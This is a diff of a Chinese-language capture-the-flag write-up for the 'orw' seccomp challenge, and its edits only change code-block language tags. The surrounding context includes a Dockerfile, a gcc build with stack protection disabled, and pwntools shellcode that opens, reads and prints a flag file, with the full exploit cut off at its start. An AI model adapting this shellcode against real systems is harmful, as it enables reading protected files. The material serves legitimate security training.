@@ -30,7 +30,7 @@ TocOpen: false
 
 使用方式如下：
 
-```bash=
+```bash
 seccomp-tools dump ./[binary]
 ```
 
@@ -40,7 +40,7 @@ seccomp-tools dump ./[binary]
 
 查看以下原始碼：
 
-```c=
+```c
 #include <stdio.h>
 #include <sys/mman.h>
 #include <unistd.h>
@@ -91,7 +91,7 @@ int main() {
 
 使用以下指令進行編譯：
 
-```sh=
+```bash
 gcc src/orw.c -o ./orw/share/orw -fno-stack-protector -no-pie
 ```
 
@@ -113,7 +113,7 @@ gcc src/orw.c -o ./orw/share/orw -fno-stack-protector -no-pie
 
 從 `Dockerfile` 開始分析，會發現 Docker 創建了 `ubuntu:22.04` 的容器，並且設定了與網路服務相關的 `xinetd`。從目錄結構可以推測 flag 位於 `/home/orw/flag`。
 
-```dockerfile=
+```dockerfile
 FROM ubuntu:22.04
 LABEL org.opencontainers.image.authors="YJK"
 RUN apt-get update
@@ -140,7 +140,7 @@ orw:
 
 以下程式就會生成可以使用來開啟 `/home/orw/flag` 再讀檔並輸出到 stdin 的 shellcode，那基本上這段程式的執行大概會是先將 `'/home/orw/flag'` 字串放到 stack，並且再透過 `open` 將 `rsp` 的內容，也就是剛剛放入 stack 的檔案路徑打開，並且後面的兩個 0 是作為設定開檔模式與設定權限的部分，再來透過 `read` 將 `rsp` 指向的檔案讀取並儲存，`rax` 是用來讀取檔案，再來透過 `write` 將 `rsp` 剛剛讀取並存入的內容輸出，並且前面的 1 為設定為 stdin，在此時即可以看到檔案內容
 
-```py=
+```python
 shellcode = b""
 
 shellcode += asm(shellcraft.pushstr('/home/orw/flag'))
@@ -159,7 +159,7 @@ shellcode += asm(shellcraft.write(1, 'rsp', 0x100))
 
 完整 exploit：
 
-```py=
+```python
 from pwn import *
 context.arch = 'amd64'
 # r = process('../orw/share/orw')
